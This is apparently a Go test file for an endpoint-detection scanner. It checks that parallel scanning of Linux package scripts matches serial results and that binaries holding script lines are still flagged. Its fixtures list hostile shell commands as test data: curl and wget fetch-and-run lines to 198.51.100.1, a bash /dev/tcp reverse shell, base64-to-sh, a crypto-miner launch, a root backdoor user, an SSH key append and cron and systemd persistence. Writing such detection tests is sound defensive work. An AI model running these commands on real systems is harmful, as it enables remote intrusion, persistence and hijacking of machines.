package linuxpkg

import (
	"math/rand"
	"reflect"
	"strings"
	"testing"

	"github.com/1ungaka/sentinel-edr/internal/prefilter"
	"github.com/1ungaka/sentinel-edr/internal/prefilter/prefiltertest"
)

// serialScan is the scan as one loop: every vector in table order, first script to
// match wins, one finding per class. It is the reference for what the fan-out must
// reproduce.
func serialScan(scripts []scriptSource) []Finding {
	seen := map[string]bool{}
	var out []Finding
	for i := range scriptVectors {
		if f := firstMatch(i, scripts, []prefilter.Hits{{}}); f != nil && !seen[f.Class] {
			seen[f.Class] = true
			out = append(out, *f)
		}
	}
	return out
}

// Findings must not depend on how the work was split: the same text has to give
// the same classes, in the same order, with the same evidence.
func TestScanScriptsIsTheSameInParallel(t *testing.T) {
	lines := []string{
		"curl -s http://198.51.100.1/x | sh",
		"bash -i >& /dev/tcp/198.51.100.1/443 0>&1",
		"echo aGk= | base64 -d | sh",
		"wget http://198.51.100.1/m -O /tmp/m && chmod +x /tmp/m && /tmp/m",
		"xmrig --donate-level 1 -o pool.example:3333",
		"useradd -o -u 0 toor",
		"echo 'ssh-rsa AAAA' >> /root/.ssh/authorized_keys",
		"(crontab -l; echo '* * * * * /tmp/m') | crontab -",
		"systemctl enable backdoor.service",
	}
	big := strings.Join(lines, "\n") + "\n" + strings.Repeat("# nothing of note here\n", parallelFrom/23+1)
	if len(big) < parallelFrom {
		t.Fatalf("the fixture must reach the parallel path: %d bytes", len(big))
	}
	scripts := []scriptSource{{name: "a", body: big}}
	want := serialScan(scripts)
	if len(want) < 4 {
		t.Fatalf("the fixture must match several vectors: %+v", want)
	}
	for range 20 {
		if got := scanScripts(scripts); !reflect.DeepEqual(want, got) {
			t.Fatalf("results differ:\n%+v\n%+v", want, got)
		}
	}
}

// One finding per class, from the first script that matches, whichever finishes
// first.
func TestFirstScriptWinsAClassInParallel(t *testing.T) {
	pad := strings.Repeat("# padding\n", parallelFrom/10+1)
	body := "curl -s http://198.51.100.1/x | sh\n"
	got := scanScripts([]scriptSource{{name: "first", body: pad + body}, {name: "second", body: pad + body}})
	seen := map[string]bool{}
	for _, f := range got {
		if seen[f.Class] {
			t.Fatalf("class %s reported twice", f.Class)
		}
		seen[f.Class] = true
		if !strings.HasPrefix(f.Evidence, "first: ") {
			t.Fatalf("%s came from the wrong script: %s", f.Class, f.Evidence)
		}
	}
	if len(got) == 0 {
		t.Fatal("the fixture must match")
	}
}

// The filter's rule over the real table, as in tradecraft.
func TestEveryVectorSurvivesItsOwnMatches(t *testing.T) {
	r := rand.New(rand.NewSource(1))
	matched := 0
	for i, v := range scriptVectors {
		for range 300 {
			text := "x " + prefiltertest.Sample(v.re.String(), r) + " y"
			if !v.re.MatchString(text) {
				continue
			}
			matched++
			h := scriptFilter().Scan(text)
			if !h.May(i) {
				t.Fatalf("%s skipped a real match on %q", v.class, text)
			}
			h.Release()
		}
	}
	if matched < 300*len(scriptVectors)/4 {
		t.Fatalf("only %d real matches: this is not testing anything", matched)
	}
}

// Script checks over a binary look like a mistake, and aren't one: an ELF carrying
// its payload as a string has this path as its only detector, so what the filter
// leaves of the cost must never be "saved" by skipping binaries. See the engine test.
func TestAnELFWithScriptLinesIsStillScanned(t *testing.T) {
	elf := append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0}, []byte("\nexport PATH=/x\ncurl http://198.51.100.1/x | sh\n")...)
	if f := Detect(elf); f == FormatUnknown {
		t.Fatal("a binary holding script lines must reach the script checks")
	}
	if r := Analyze(elf, Options{}); len(r.Findings) == 0 {
		t.Fatal("the payload must be found")
	}
}
